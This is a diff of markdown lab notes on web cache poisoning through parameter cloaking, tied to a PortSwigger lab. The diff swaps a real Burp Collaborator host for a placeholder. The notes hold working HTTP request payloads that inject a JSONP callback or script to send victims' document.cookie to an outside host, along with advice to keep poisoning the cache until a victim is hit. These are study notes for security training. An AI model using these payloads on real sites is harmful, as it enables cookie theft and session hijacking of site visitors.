@@ -813,18 +813,18 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=EVILFunction
 ```  
 
-![utm_content_cloaking.png](images]utm_content_cloaking.png)  
+![utm_content cache cloaking](images/utm_content_cloaking.png)  
 
 >Cache Cloaking Cookie Capturing payload below, keep poising cache until victim hits stored cache.  
 
 ```
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://5ciaan3qrdgpqf1fxsjxtid5lwrnff34.oastify.com?nuts='%2bdocument.cookie%3b HTTP/2
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://COLLABORATOR.com?nuts='%2bdocument.cookie%3b HTTP/2
 ```  
 
 >Below is [Url Decoded](https://www.urldecoder.org/) payload.  
 
 ```
-GET/js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://5ciaan3qrdgpqf1fxsjxtid5lwrnff34.oastify.com?nuts='+document.cookie; HTTP/2
+GET/js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://COLLABORATOR.com?nuts='+document.cookie; HTTP/2
 ```  
 
 [PortSwigger Lab: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)  
